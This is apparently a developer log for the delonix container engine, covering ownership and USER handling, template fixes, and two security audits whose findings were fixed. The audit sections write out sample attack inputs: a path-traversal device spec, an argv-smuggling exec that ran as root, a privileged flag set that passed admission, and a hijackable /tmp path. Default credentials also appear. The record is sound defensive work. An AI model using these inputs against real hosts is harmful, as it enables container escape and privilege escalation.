- **With `--user`, the application user becomes OWNER of the entire rootfs.** The init does
  `chown_tree_once("/", uid, gid)`. Measured: 940 of 986 entries of `haproxy`, which wrote in
  `/etc/passwd` and replaced `/usr/local/sbin/haproxy`. A non-root owning the system
  files is not the confinement a non-root is chosen for.
- **The same sweep crosses the mounts, and a bind mount is the HOST.** `-u haproxy -v
  <folder>:/app` changed the owner of the folder and of the files on the host from `1000:1000` to the subuid
  `100098`, and the original owner could no longer write to his own file. A named
  volume is re-appropriated the same way — it is the only reason the user can write to it today.
- **The cost grows with the image**: each `lchown` of a file from a shared layer copies it
  to the write layer (13 MB for a 15 MB image; on `odoo:20.0`, ~2 GB, the sweep
  was still running at 16 min with the disk saturated).
- **Why it exists**: the layers store everything with the invoker's owner, so the ownership the
  image recorded is lost (`/var/lib/haproxy` belongs to `haproxy` in the image and `root:root` in a
  container without `-u`). The sweep was the patch.

**Decided in ADR-0062 (Proposed), in three steps**: P0 — `run` SAYS when `USER` is not
applied; P1 — remove the sweep and return only what the image gives; P2 — the default becomes the
image's `USER`, in the next major. **Do not change the default before P1**: with the old
mechanism, every image with `USER` gained the three defects without asking for them.

**P0, P1 and P2 are done** (the ADR became Accepted). P2: without `--user`, the process runs as the
image's `USER`; `--user 0` stays root. It is a breaking change to the `container run` contract, so the release
that carries it is a major. On a rootless host without subuid only one uid fits: it stays at 0 and `run` says so
(`RunHost::can_map_id_range`).

**The `build` follows the same rule** (measured and fixed next). The work containers do not
pass through `resolve_run`, and had three defects: a `RUN` after `USER app` ran as
root; a `RUN` over a base with `USER` ran as root; and **a rebuild with cache lost the
owners** (`/home/app` went back to `root`). Now `USER` is a positional step (`Step::User`): each
`RUN` runs as the user in effect, resolved against the stage's `/etc/passwd` at THAT step
(a name that does not exist is an error there). The flat tree receives the base's owner index
(`__chownidx`), and the stage clone and the cache copy inside the mapped userns (`__cptree`) —
a `cp -a` from outside cannot keep a subuid owner. The `WORKDIR` continues to be created
by root, as in Docker. Gate: two «build:» checks in the `USER` section of `scripts/e2e.sh`.

- **The owner index** (`delonix_compute::owners`, `delonix-oci::owners`): on extracting a layer,
  the entries that the tar gives to a non-root go to `layers/<hex>.owners` (BESIDE the folder, never
  inside — what is inside becomes a file of all containers of the image), and the container
  receives the merged index in `overlay-owners`, beside `overlay-lowers`. Per path, it decides
  the highest layer that contains it: a higher layer that brings the path back as root
  removes it. The extraction loop is that of the `tar` crate (0.4.46) itself, repeated because
  `Archive::unpack` does not give access to the headers.
- **The init applies it once** (`overlay-owners.applied`), after the `pivot_root` (the paths
  are confined to the rootfs), only when the process runs as non-root, and **never on another
  filesystem**: an entry that resolves inside a mount is skipped.
- **Volumes**: an EMPTY named volume takes the owner the image gives to the mount point, or the
  container user's when the image names no one. A volume with data and a bind
  mount are never touched. A named volume is recognised by its shape on disk
  (`<name>/_data` with `meta.json` beside it), not by the name.
- **Preserving the owners ON DISK was set aside by the spike**: it forced every reader of the
  store (the `build` flat export, the flat→overlay migration, the scanner, `system df`, the
  removals) to deal with files that do not belong to whoever runs the engine. The cost of the index is
  written in the ADR: it copies to the write layer what the image gives to non-root (two entries in
  `haproxy`; a whole tree in an image with `COPY --chown`).
- **The `container commit` wrote the HOST uids into the layer** — found by step 6 of the
  validation, not by reading: all `1000:1000` entries and the container's uid 1000 folder
  as `100999`. With the index, that image would give the entire rootfs to uid 1000. The packer
  now passes each owner through the rootless map (`container_id_of`: invoker → 0, subid → offset
  + 1). The `build` was not affected, because it packs inside the mapped userns. The commit also
  dropped the base image's `USER`.
- **Measured afterwards** (`haproxy:3.4-alpine`, `-u haproxy`): `/etc/passwd` and the binary refused;
  2 of 987 of the user's entries (they were 940); the host bind keeps `1000:1000` and the owner
  keeps writing; write layer 56 K (it was 13 MB). The battery gate, run against the
  pre-P1 engine, fails 4 of the 6 ownership checks.
- **`odoo:20.0`, the image where the cost was measured**: first boot with `-u odoo` in 1.7 s
  (before, still sweeping at 16 min); 4 of 122,363 entries of `odoo`; write layer 480 K;
  the filestore volume writable. The `odoo` template may now declare `user: odoo` AFTER
  P1 is merged — before that it would trigger the old sweep.
- **Validated afterwards, in a VM** (Ubuntu 26.04, k8s 1.36.4): engine as real root (ownership `99:99`
  on the image folder, `/etc/passwd` refused, host bind intact); CRI on a kubeadm node (pod without
  `securityContext` → uid 99, `runAsUser: 0` → 0, `runAsUser: 1234` → 1234); rootless without
  subuid (uid 0 with a warning).
- **The extraction now preserves setuid/setgid/sticky** (`set_preserve_permissions`): the `/tmp`
  of ALL containers was `777` instead of `1777`, and a setuid `su` lost the bit. A layer
  extracted by an old engine is corrected from the blob headers the first time
  an image uses it (marker `layers/<hex>.modes`).
- **A mount target behind an image symlink was REFUSED** (`safe_bind_target`), and that
  broke Kubernetes: Alpine and Debian have `/var/run -> /run`, and the kubelet mounts the token in
  `/var/run/secrets`, so every pod from those images failed with `failed to prepare the rootfs:
  EINVAL`. Only a real kubelet showed it (the previous validations used busybox and CoreDNS, which
  do not have the symlink). Now it is resolved inside the rootfs, component by component: an
  absolute link restarts at the rootfs and the `..` stops there.
- **The `odoo` template runs as `odoo`** (`user: odoo` in both manifests, 2026-10-01, after
  P1 merged). Measured live: uid 100, without the «Running as user 'root'» warning, filestore
  writable in a new volume, `/etc/passwd` refused; in the dev profile the `addons/` and
  `config/` binds stay `1000:1000` on the host and the owner keeps writing. A filestore volume
  written as root by a previous run is NOT migrated (the README says so).

**Method lesson**: the first probe (`stat` right after `run -d`) showed the binaries
still `root:root`, and I almost wrote that the cost was small and the semantics right — the sweep
was still running (`run -d` returns before it, on purpose). What fixed it was counting the
owners of ALL files a minute later, instead of looking at two.

## The `odoo` template would not boot: the limits preflight did not see the cgroup2 in an own network (2026-09-30)

Reported as «`delonix init` fails to boot an Odoo project». Reproduced with isolated root and
network: `init -t odoo` generates fine, the `build` passes, and the `stack apply` stops at the container with
`-m/--cpus/--cpu-weight were requested but this session has no cgroup2 delegation` — in a session
whose `system setup` says `limits: APPLY`. Odoo is the only template with `network:`, and that is what
separates it from the other ten.

- **The cause is the 2nd pass of `--net <network>`/`--pod`**: it runs under `ip netns exec`, which mounts
  a new sysfs over `/sys` and leaves `/sys/fs/cgroup` with ZERO entries (measured). The `spawn` already
  knew (`reveal_cgroup2_if_masked`, with the comment «what is missing is visibility, not
  permission»); the preflight probe (`cgroup_limits_apply`, #307) and the sister `leaf_controllers`
  came later and never unmasked. With the `DELONIX_ALLOW_UNENFORCED_LIMITS=1` valve the same
  container ended up with `memory.max`/`cpu.max` applied — so the refusal was a false negative.
  The two probes now unmask before looking (no-op where the cgroup2 is already visible).
- **Every limits check in `scripts/e2e.sh` used `--net none`**, so none
  passed through the 2nd pass. The new gate runs `-m 64M --net <network>` and reads the `memory.max` of the
  real cgroup; old binary rc=1 without a cgroup, fixed rc=0 and `67108864`.
- **The message the user saw hid the cause**: `did not start inside the network
  '211be9940c59' (exit Some(69))` — a netns hash that is in no manifest, an
  `Option` in Debug, and the inner process's exit 69 flattened to 1. `netns_start_error`
  names the user's network and returns the class that the inner pass decided.
- **Odoo 20 becomes the default** (`template.meta` `version=20.0`; `odoo:20.0` exists on
  Docker Hub). Odoo 20 requires PostgreSQL ≥ 16 (`MIN_PG_VERSION` of `release.py`), which is the
  manifest's `postgres:16`. `without_demo = all` became `True`: since 19 the option is
  boolean and `all` only survives as the warning «invalid boolean»; `True` means the same in 18.
- **`fastapi` is the name of the template that was called `python`** — it always generated a FastAPI
  service. `python` continues to answer as a silent alias (`TEMPLATE_ALIASES`, the renamed-Kinds
  rule), and there is a test requiring that the two produce the same project. The `init` detection
  (`pyproject.toml`/`requirements.txt`) points to `fastapi`. Default `0.142` (the previous one,
  `0.115`, was a year old). **The dev group carries `httpx` AND `httpx2`**, measured: the current Starlette
  deprecates `httpx` (a warning on each `pytest`), and the Starlette of a `-v 0.116` imports nothing
  else — only `httpx2` broke the tests of a project with an old `-v`.
- **Odoo 20 listens on `127.0.0.1` by default** (`http_interface`, `config.py` of 20.0; 19
  warned «will change to 127.0.0.1 in 20.0»). Inside a container that makes the published
  port unreachable: the `--up` built, applied and gave up on the health — with the log saying
  `HTTP service running on 127.0.0.1:8069`. Both `.conf` carry `http_interface = 0.0.0.0`
  (the option exists in 18 and 19), with a test.
- **The Odoo dev manifest never worked**: `./addons:/mnt/extra-addons` in an own network
  gave `no such bind path ./addons`. The relative source is canonicalized against the CWD, and the 2nd
  pass does not run in the user's CWD — the same class as the `source_dir` of `kind: App`.
  `anchor_relative_binds` anchors them in the 1st pass, before writing the re-exec spec.
- **The `--up` waited 40 s for the health**; measured with load ~30, Odoo 20 in `dev_mode` took
  ~85 s from the first log to HTTP. It becomes 120 s — it is a ceiling, a healthy app answers before.
- **Validated live**: Odoo 18 (the reported case) `stack apply` → `/web/health` `pass` and
  `psql` from the Odoo container to `db` answering PostgreSQL 16.15; Odoo 20 (`odoo:20.0`, build
  of the template without `-v`) through the dev manifest (bind-mounts included) and with the production
  `odoo.conf` → `HTTP service running on 0.0.0.0:8069`, health `pass`, and the same `psql`; FastAPI
  0.142.2 and 0.116.2 with `uv sync`, `ruff`, `pytest` and the server answering
  `/api/v1/health/live`. **Not re-run after the fixes**: the end-to-end `stack init -t odoo --up`
  with the rebuilt image (the build takes ~45 min on this host); each of its steps
  was proven separately.
- **Cost measured and NOT touched**: the rootless Odoo build takes ~20 min on this loaded host. Each
  `COPY` (even of a file) snapshots the entire rootfs to the build cache
  (`cp -a --reflink=auto`, and ext4 has no reflink) — 2–4 min and ~2 GB per instruction on a 2 GB
  image. It is the trade-off already written at the top of `cmd/build.rs`; a diff-based cache
  format is its own work.
- **Investigator's own trap**: recompiling the binary while a `build` runs makes
  `__buildtar` (which re-executes `current_exe()`) fail without a message — the `execv` of a file
  that was replaced. The first reproduction «failed» because of that. To measure, copy the binary to a
  stable path and never overwrite it while anything of it runs (the holder also uses it: `cp`
  over it gives `Text file busy`).


## Infrastructure and ERP templates against the master prompt (2026-10-01)

The four templates without application code — `nginx`, `httpd`, `haproxy`, `odoo` — reviewed
against the «infrastructure/ERP» line of the master prompt of the `init` templates. The seven
application ones and the generator (`scaffold.rs`, `init.rs`) are from another work front.

- **nginx, httpd, haproxy** now have: a JSON access log on stdout with `request_id`
  (the caller's, or a generated one; returned in the response), `/healthz` out of the log, explicit
  timeouts and body limit, security headers, an unpublished metrics/status endpoint,
  config verified AT BUILD (`nginx -t`, `httpd -t`, `haproxy -c`), commented blocks
  of TLS and proxy, `scripts/smoke.sh` and a README with the real commands. Defaults:
  nginx `1.30` (= the image's `stable` tag), haproxy `3.4` (= `lts`), httpd `2.4`; read by
  digest on Docker Hub on 2026-09-30.
- **Three traps, each one measured**: in nginx, an `add_header` inside a `location`
  CANCELS those inherited from the `server` — the old `/healthz` lost all the security headers;
  in HAProxy, the responses the proxy generates (`http-request return`) skip the `http-response`
  rules and only pass through `http-after-response`; and httpd refuses to boot without
  any configured interface (`AH00530 … getaddrinfo fail` with `--net none`) — it is not
  `mod_unique_id`, it is `Listen`, and the build's `RUN httpd -t` passes because the build has a network.
- **The Odoo production manifest was a dead end**: `list_db = False` turns off the
  database manager, and the README told you to «create the first database in the UI». Measured on
  `odoo:20.0`: `/web/login` → selector → «database manager has been disabled». With
  `db_name = <name>` Odoo creates and initializes the database itself on first boot (~10 s on a
  quiet disk); the `dbfilter` pins the requests to it.
- **The database is born with `admin`/`admin`.** The README gives the change command (`odoo shell` via
  `container exec -i … /entrypoint.sh`), and the smoke FAILS while the factory password
  works — measured in both states.
- **Addon tests need `--test-tags /<addon>`**: without that, a new database runs the
  ~1000 tests of `base` and dependencies, 36 fail outside Odoo's CI, and the command exits 1 with
  the addon's test passing.
- **`stack destroy` deletes the stack's volumes** — the README said «volumes stay». Fixed,
  with the command that stops without deleting.
- **Engine finding, NOT fixed**: `container run` does not apply the image's `USER`
  (`odoo:20.0` declares `user = odoo` and runs as uid 0; so since v1.0.0). `-u odoo`
  works but triggers the `chown_tree_once` of the entire rootfs — more than 16 min on ~2 GB with the
  disk saturated. Changing the default is a semantics decision for all containers.
- **`container start` in an own network** gave the old message (netns hash and
  `Some(1)`); it now passes through `netns_start_error`, like `run`. Proven by a unit test; the
  live reproduction was interrupted by a host restart.
- **Validated live**: `stack init -t <t> --up` with isolated root and the generated `scripts/smoke.sh`
  — nginx 9/9, httpd 9/9, haproxy 7/7; odoo (20.0 by default) `--up` in 459 s with the
  database initialized, production smoke 4/4 after the password change, dev smoke 2/2, and
  a real addon with a passing test (`0 failed, 0 error(s) of 3 tests`).
- **Method**: the first harness deleted the isolated root right after `stack destroy`. A
  supervisor with `restart: always` whose record disappears boots the container again —
  an orphan nginx was left holding the port and made the next two templates fail. Wait
  until no process with that `DELONIX_ROOT` is alive before deleting the root.

## Silent failures fixed (fail-closed) + 1 documented

From the Docker/Podman analysis (`docs/COMPARACAO-DOCKER-PODMAN.md`), four cases in
which an option was ACCEPTED and then IGNORED — worse than a missing feature,
because the user thinks they are protected. Three fixed to fail-closed
(explicit error/warning, aligned with the "no silent failure" invariant):

1. **`--security-opt seccomp=<perfil.json>`** — a custom profile was ignored (the
   container ran with the built-in allowlist). It now becomes an explicit ERROR: only
   `seccomp=unconfined` is supported; custom profiles are not implemented.
2. **`-v host:/dst:z|:Z|:U|<propagação>`** — the 3rd field only recognised `ro`; the
   SELinux options were ignored and the bind failed on RHEL/Fedora enforcing.
   It now becomes an ERROR: only `:ro`/`:rw` supported (`resolve_spec`).
3. **`--network-alias`** — recorded but `dns_resolve` never consulted it.
   It now becomes a WARNING on `run` (implementing resolution by alias is a follow-up).

4. **`cpuset`/`cpu.weight`/`io.weight` in the rootless-delegated cgroup** — `try_delegated_base`
   (`crates/adapters/delonix-linux/src/lib.rs`) already enabled `+cpuset`/`+io` in the
   `subtree_control` of the delegated base, but never WROTE `cpuset.cpus`/
   `cpu.weight`/`io.weight` in the leaf — only `memory.max`/`pids.max`/`cpu.max`. The
   non-delegated (root) path already applied the three correctly; the delegated one
   (the NORMAL mode in rootless) did not. **Fixed**: the same three best-effort `fs::write`
   of the root path, now also in the delegated leaf. **Validated
   live on this host** (kaeso-sys-01, session under `user@1000.service`): a
   real `container run --cpu-weight 500` confirmed `cpu.weight=500` in the real
   leaf at `/sys/fs/cgroup/.../dlx-containers/dlx-<id>/cpu.weight` (the
   `cpu` controller is delegated here). `cpuset`/`io` remain to be
   confirmed on a host where those two controllers are actually
   delegated — **confirmed that this host does NOT delegate them** (`systemd-run
   --user --scope -p Delegate=cpuset` only returns `cpu memory pids`, even
   explicitly requesting `cpuset` — a limit of the distro's own `user@.service`,
   not of the delonix code); the code writes the files
   anyway, best-effort, exactly as the root path already did — without a
   delegated controller the kernel simply does not create `cpuset.cpus`/
   `io.weight` in the leaf, and the `fs::write` fails silently there (the same
   behaviour accepted in the root path for the same scenario). A pure regression
   test (without a real cgroupfs): `try_delegated_base_aplica_cpu_weight_
   cpuset_e_io_weight_na_leaf`.
5. **`container update --memory/--cpus`** — **DONE**. The `runtime::
   update_limits` function already existed in the engine (its own "`docker update`" label in the
   doc-comment) but never had a single caller — exactly the same pattern
   already seen with `mount_live`/`set_net_rate`: dead code by calling, with a
   latent bug that only showed up when wiring the first caller. **BUG FOUND AND
   FIXED on wiring this up**: `update_limits` computed the cgroup by
   `container.cgroup()` — the STATIC formula `delonix.slice/delonix-<id>`, only
   valid in root mode. In rootless delegated (the normal path), the real cgroup
   lives somewhere like `.../dlx-containers/dlx-<id>` (discovered at runtime via
   `/proc/<pid>/cgroup`) — exactly the reason for the existence of `live_cgroup()`
   (already used by `set_frozen`/`is_frozen` of `pause`/`unpause`), which
   `update_limits` simply did not use. Result before the fix: the command
   said "updated", the record changed, but the REAL cgroup of the running
   container stayed untouched — only a `restart` (which recreates the cgroup from the
   record) applied the new limit. Fixed by swapping `container.cgroup()`
   for `live_cgroup(container)` in `update_limits`. **Validated live**: `-m
   64M --cpus 0.5` → `update --memory 128M --cpus 1.0` → `memory.max`/`cpu.max`
   of the REAL cgroup (without `restart`) confirm `134217728`/`100000 100000`
   immediately. Without a pure unit test (unlike the sibling cpuset/
   cpu.weight/io.weight fix): `DELONIX_SLICE` is an absolute-path constant,
   not injectable like the `base` of `try_delegated_base`, and `live_cgroup` reads
   `/proc/<pid>/cgroup` of a real process — live validation is the proof
   available here, the same pattern already accepted in other cgroup/namespace
   boundary fixes in this codebase.
## Security audit #3 (2026-08-10) — the industry's CVE classes, 6 finders in parallel

Request: review the entire security structure against the critical attacks that Docker/K8s/runc/
CRI-O/Podman have already suffered. Six adversarial audits in parallel (rootless→root escalation and
namespace escape; command/argv injection; container escape via mounts/proc/sys/caps; memory safety
of the ~245 `unsafe`; supply chain and path traversal; network isolation and secrets). **Zero
CRITICALS. 1 HIGH, 5 MEDIUMS, 7 LOWS — all fixed in this session**, each with a regression
test and, where the path allowed it, live validation.

**Posture confirmed against the known attacks** (read in the code, not inferred): CVE-2019-5736
(the re-exec uses the host's `current_exe()`, before any rootfs), CVE-2024-21626 "Leaky Vessels"
(`close_range` on the forks, CLOEXEC, and the `exec`'s `chdir(workdir)` already runs inside the
container's mnt-ns), CVE-2022-0811 "cr8escape" (sysctl allowlist + `/proc/sys` RO), CVE-2022-0492
(cgroup v1 release_agent — **not applicable**, the engine is v2-only), nested userns (`clone`
filtered + `clone3`→ENOSYS *always* installed), tar-slip, Shocker/`CAP_DAC_READ_SEARCH`.

**What the audit found anew, and the lesson of each:**

1. **HIGH — digest-pinning was decorative.** `pull …@sha256:X` verified each BLOB against what
   the manifest declared, but never the MANIFEST against the requested digest — a compromised
   registry (or a malicious mirror/HTTP) returned a wholly different manifest, internally
   consistent, and installed the attacker's content without an error. It is the same threat model as
   CRITICAL finding #3 of 2026-07 (blob-vs-manifest), **one level up** — and it is the very reason a pin exists.
   `verify_manifest_digest` (`registry.rs`) on both pull paths + on the multi-arch sub-manifest.
   A test that **fails with the fix reverted** (measured: without it the pull returns an `Image`).
2. **MEDIUM — `bind_devices` was the last bind path without confinement.** Destination by
   raw concatenation + `File::create` (which TRUNCATES): a `spec.devices: ["/dev/null:/../../etc/x"]`
   from an untrusted manifest escaped the rootfs and **truncated a host file**. Two independent
   finders converged on the same sink. It now uses the `mount_target_safe`+`safe_bind_target`
   +`truncate(false)` that `bind_volume` already used a few lines away. Measured before/after: the
   victim file was left with **0 bytes**. Also closed along the way were `/dev/mem`//`kmem`//`port`
   (char devices, so they passed the filter that only rejects BLOCK — inert in rootless, total host
   compromise on the root/CRI path).
3. **MEDIUM — a VM's `tap` had no anti-spoofing.** The veths have had it forever
   (`iifname … ip saddr != <ip> drop`), the tap never had — and it is where it MOST matters, because the
   guest kernel is not ours and all of this engine's policy (cross-namespace isolation,
   `kind: Dependency`) decides by the SOURCE IP. A VM forged a `saddr` outside `@dlxall` — or
   of a peer of the target namespace — and crossed the boundary. The rule now has **a single
   definition** (`antispoof_rule_args`) shared by all three sites, the same
   generator-and-reader-share-the-format discipline as `fw_rule_tail`; `do_vmtapdel` cleans it up like
   `do_detach_extra` already did (tap names are reused across restarts).
4. **MEDIUM — the default masked-paths list was shorter than runc's.** The engine masked only
   what grants host CONTROL (`sysrq-trigger`, `kcore`); it lacked what leaks INFORMATION
   (`timer_list`/`sched_debug` = kernel pointers/KASLR, `interrupts` = timing side-channel,
   `/sys/firmware`). The CRI path was fine (the kubelet sends its own list); only the
   CLI was exposed. `DEFAULT_MASKED_PATHS`/`DEFAULT_READONLY_PATHS` applied when the caller
   passes no `--masked-path` and is not `--privileged` (Docker/runc semantics). **Measured live**:
   `/proc/interrupts` leaked 109 lines and `/sys/firmware` 4 entries; they went to 0.
5. **MEDIUM — multi-thread `clone()` in `serve docker-api`.** The `// SAFETY: single-threaded` of
   `clone()` is FALSE on this path: the server is a multi-thread tokio runtime, and `clone()` (unlike
   `fork()`) **does not run the `pthread_atfork` handlers** that reset the malloc lock in the
   child — under concurrent requests `container_init` could block forever. It became a
   re-exec (`__apirun` with the spec via a `0600`/`O_EXCL` file, plus `container start/restart` from the
   CLI), the same pattern the CRI already used. **The spec goes by file and not by argv on purpose**:
   `RunOpts` has dozens of fields and reconstructing a command line would silently lose what
   has no flag — the trap this repo has already paid for several times.
   - **Bug found while validating live, and predicted by the code itself**: the comment on
     `spawn_zombie_reaper` warned that a blind `waitpid(-1)` would "corrupt the exit state" of
     any path doing its own `waitpid` — and the re-exec is exactly that path.
     The container started fine and `create` returned `ECHILD`. The reaper now **peeks with
     `WNOWAIT`** and only reaps pids nobody claimed (`AuthoritativeLivePorts` on the network side,
     `CLAIMED_PIDS` here). Validated: full lifecycle (create/start-304/restart/stop/rm), **8
     concurrent creates → 8 running containers**, and zero zombies.
6. **MEDIUM — golden credentials not documented.** *(SUPERSEDED on 2026-08-18: the image
   stopped carrying any password — see "The base image carries no credentials". What follows is the
   record of what was true as of this audit.)* `root/delonix` + `delonix:delonix` with sudo
   NOPASSWD are FIXED and public (they are in the code), and there was not a line about it in the README.
   The golden now disables **SSH password login** (drop-in **and** `sshd_config` — the
   bullseye one has no `Include` line, and sshd uses the FIRST occurrence, so a blind
   append would be ignored); the serial console still accepts the password, which is the case where it serves.
   Documented in the README.

**LOWS closed**: `reap_orphan_hostfwds` stopped accepting a raw `HashSet` — it now requires
`AuthoritativeLivePorts::new(...)`, a type whose sole function is to force the caller to **assert it
owns the entire ingress** (it was an external caller with a partial list that made the published ports
die on their own, and it cost several sessions to diagnose); `CredVault::write_0600` now uses the
`write_atomic_mode` of the sibling `SecretStore` (per-writer temp + fsync + mode at creation — in an
AEAD blob a torn write is not a corrupt file, it is a credential **forever**
undecipherable); `~/.kube/config` is no longer written-then-`chmod`'d; `--` before the positionals
of `mount` and `qemu-img convert`; a leading `-` guard on the ngrok hostname (the token already had it,
having been exploitable — the hostname is in the same kind of slot and had never been looked at); a
32 GiB ceiling in `stream_download`; `personality(2)` restricted to the safe values (Docker's default
blocks `READ_IMPLIES_EXEC`/`ADDR_NO_RANDOMIZE`, which are not an escape but remove mitigations).

**Pass 2 — the class the finders did not see: hijackable temporary file.** A later sweep
of `std::env::temp_dir()` found three PRODUCTION callers of the same class the 2026-07
audit had already fixed in `ensure_libvirt_network` — none of the six finders reached there
because `bpf.rs` was not in the surface assigned to them (**method lesson**: a sweep
by PATTERN, done after the per-subsystem finders, catches what the by-files division lets
fall through).

- **`delonix-sdn::bpf::stage_object` — local privilege escalation.** It wrote the BPF object to the
  **FIXED** path `/tmp/delonix_flow.bpf.o` with `fs::write`, and that file is handed to
  `bpftool prog loadall` by a process with **CAP_BPF/root**. `/tmp` is world-writable, `fs::write`
  follows symlinks, and — worst — whoever pre-created the path became the **OWNER** of the file: in a
  sticky `/tmp` we cannot even delete it, so they could swap its content between our write and
  `bpftool`'s read. An unprivileged local user put THEIR BPF program inside the
  kernel. The other two (`cluster.rs` kubeadm-config, `lb.rs` haproxy.cfg, both sent via
  `scp`) had a name derived from the pid — equally guessable, same redirection vector.
- **`delonix_runtime_core::write_private_temp`** (new, a single site instead of a 4th copy): unique
  name + **`O_EXCL`** (rejects an existing path and **does not follow symlinks**) + `0600` at creation.
  The BPF object is now also **removed after the load** — with a fixed name it was overwritten on the
  next call, with a unique name it would accumulate.
- **`fetch_kubeconfig`: `mode()` only applies at CREATION.** The previous fix
  (`OpenOptions::create(true).mode(0o600)`) closed the umask window but had a more
  silent hole: a repeated `cluster apply` over a kubeconfig left by an old build
  rewrote the credentials and **kept the 0644 from there**. It became `write_atomic_mode` — the rename gives
  the right mode always, replaces a symlink instead of following it, and makes the update atomic.
  (The previous comment claimed equivalence with the `ensure_libvirt_network` fix, which uses
  `create_new`; it was not equivalent, and that is the difference.)

**State**: `cargo build/test --workspace` clean (0 failures), `clippy` 0, `fmt` applied. Validated
live on this host: masking inside real containers (musl AND glibc), `docker-api` end-to-end
with concurrency, `net flow` (degrades to veth counters without CAP_BPF, and no longer creates the
fixed path nor leaves leftovers), and normal `container run` without regression.

## Security audit #4 (2026-10-12) — OWASP K8s/Docker Top 10, Kinds and providers

Lens: OWASP Kubernetes Top 10 (K01 workload configuration, K04 centralized policy,
K08 secrets) and Docker Top 10 (D04/D05), applied to node admission, to the CRI, to the Kinds and
to the providers. **The two defaults that the `delonix-runtime-sec` skill flagged as open were already
closed** (CRI cap ceiling safe by default; unpack limited to 64 GiB and
4 M entries) — the skill's baseline is out of date. Seven new findings, all
fixed, each measured before (red) and after (green, live when the path
allowed it, with the two roots isolated):

1. **HIGH — `kubectl exec <pod> -- -u 0 sh` ran as root in the container.** The CLI reads
   options AFTER the container name (`container exec x -u` answers "a value is
   required for '--user'"), and the CRI passed the user command right after the
   name — on both paths, streaming and `ExecSync`. It bypassed `runAsNonRoot`/
   `runAsUser` with just `pods/exec`. Now `exec <name> -- <cmd>`; a CLI test
   parses the exact argv the CRI builds and requires `user == None`.
2. **HIGH — `denyPrivileged` judged ONE flag.** Measured: `--cap-add ALL --security-opt
   seccomp=unconfined --host-pid -v /:/host --device /dev/sda` passed admission on a
   node with `denyPrivileged: true`. New field, opt-in, `workloadSecurity: baseline` — the
   *baseline* profile of the Pod Security Standards at the SINGLE admission point (CLI,
   manifest, compose, Docker API and CRI converge in `cmd_run`): caps outside the
   baseline list, `--host-pid/--host-ipc`, `seccomp/apparmor=unconfined`, host-path bind
   and `--device`. Rules `ADM-BASELINE-*`. The host network is covered by `denyHostNetwork`
   (it is the engine's default network); `restricted` is rejected by name (it needs the
   image's effective user, which admission does not have). A policy with only
   `denyPrivileged` now denounces its own hole (`POLICY-PRIVILEGE-EQUIVALENTS-OPEN`).
   **The capabilities of the engine's default set do not count as a request**
   (fixed on 2026-10-21, in the rescue of #841). The first version compared each
   `--cap-add` only against the PSS list, and the CRI, when applying the capabilities ceiling,
   rewrites the whole default set as `--cap-drop ALL` plus one `--cap-add`
   per capability, with `NET_RAW`, `NET_BROADCAST` and `SYS_CHROOT` included. Measured with
   `crictl`: on a baseline node, a pod with no requested capabilities was rejected for
   `NET_BROADCAST,NET_RAW` and no pod started, the static pods included. The criterion
   becomes the effect: requesting again what every container already receives
   (`KEPT_CAPS`, handed to admission in `ContainerHardening::default_caps`) does not widen
   anything. We ended up more permissive than the PSS at one point, and on purpose: the PSS rejects an
   explicit `add: [NET_RAW]`, but here the result of that request is the same as that of a
   container that requested nothing. Gate: `re_stating_the_engine_defaults_is_not_asking_for_more`.
3. **HIGH — `kind: VirtualMachine` did not pass through admission.** Only the CLI's `vm create`
   called `policy::enforce`; the same VM by manifest bypassed `denyDevicePassthrough`,
   `denyLatestVmImage` and `allowedImageUrlHosts`. And a manifest has more passthrough
   gates than the CLI: `devices`, an `extraDisks` sourced from a host device,
   and raw libvirt XML (not validated — it always counts). The `vm update --disk-add` (hotplug)
   too. Detection follows symlinks (`./innocent.qcow2 → /dev/sda` is rejected, measured).
4. **MEDIUM — the L7 proxy let the client write `X-Forwarded-*`.** It was the edge and did not
   write its own; a backend that trusts them (the `init` templates send
   `TRUSTED_PROXY=*` behind the tunnel) accepted a forged IP and `https`. The client's are
   discarded and the proxy writes peer, listener scheme and Host. Measured with the
   `ingress-proxy` and an echo backend.
5. **MEDIUM — tunnel credentials in the argv** (`--token`, `--authtoken`, `token@host`):
   readable by any local user in `/proc/<pid>/cmdline`. They now go by environment
   (`TUNNEL_TOKEN`, `NGROK_AUTHTOKEN`, measured on the real binaries) or by a `0600` ssh config
   (pinggy); the agent log is `0600` because ngrok writes the authtoken there when
   it rejects it.
6. **MEDIUM — the OPNsense client accepted `http://` and userinfo** and sent key/secret in
   the clear; the other three providers already rejected it. DX-1349, validated inside `connect`.
7. **LOW — the MCP passed the model `name` to the argv without `--`** (the model may have read
   logs controlled by an attacker).

**The functional gate (`cli-tester`) failed the first version, and rightly so:** the
*baseline* closed `run` and left three gates open on the same node —
`container update --volume-add /etc:/x` (the container read the host hostname),
`--gpus dri` (raw `/dev/dri` nodes) and `--masked-path /x` (a custom list REPLACES the
default one, and `/proc/interrupts` had 142 lines again). The three were closed; the
`--masked-path` requires the core that every kubelet sends, **without** the
`/sys/devices/virtual/powercap`, which only recent kubelets send — requiring it would reject
every pod of an older kubelet on a *baseline* node. `--gpus nvidia` and a
`--device` CDI remain allowed (they are the engine's *device plugin*). Also: a VM's boot
disk that is a device counts as passthrough, and DX-1349 reached the
operator as DX-1000 (it went through `into_root`, which throws away the number). The
`scripts/e2e.sh` battery now has a section that pins all of this by the policy MESSAGE.

**Two fix defects caught along the way, both silent:** the
`hot_fields(RuntimePolicy)` listed 8 of the 12 compared fields, so turning on
`denyPrivateEgress` on an already-applied manifest planned an impossible `Replace` (there is now a
test that requires the two lists equal); and a flat `devices: ['0000:01:00.0']` in a
`kind: VirtualMachine` was thrown away (`merge_device_options` did a `remove` inside a
`let … else` before the pattern failed — the dry-run printed `devices: []`, rc 0).

**Method lesson, to keep:** the class of findings 1 and 7 is the same one that audit #1
closed for `ssh`/`virsh` — a value from elsewhere in the argv of a binary with options — and
it reappeared in the engine's OWN CLI, because "it is our binary" read as "it is safe".
Any argv built for `delonix …` from an outside value takes `--` before
it. And the class of findings 2 and 3 is "the gate has a second door": a policy
rule is worth as much as the LEAST-guarded path to it.

**To do, with the reason:** `delonix drift` ignores `RuntimePolicy` (it has no owner,
and drift only compares stamped resources) — a hand-edited `policy.json` does not appear,
whereas `stack plan` sees it; it predates this audit. Signature verification on pull required by policy
(`image verify` exists and is manual — wiring it to admission is a feature with a node key, not
a line); the `restricted` profile; and `ExecSync`/streaming proven by a test of the real
parser and not by a `crictl exec` against a kubelet (the argv is the same).

## CRI on a kubeadm node: eviction without stats and `kubeadm reset` with orphans (2026-09-15)

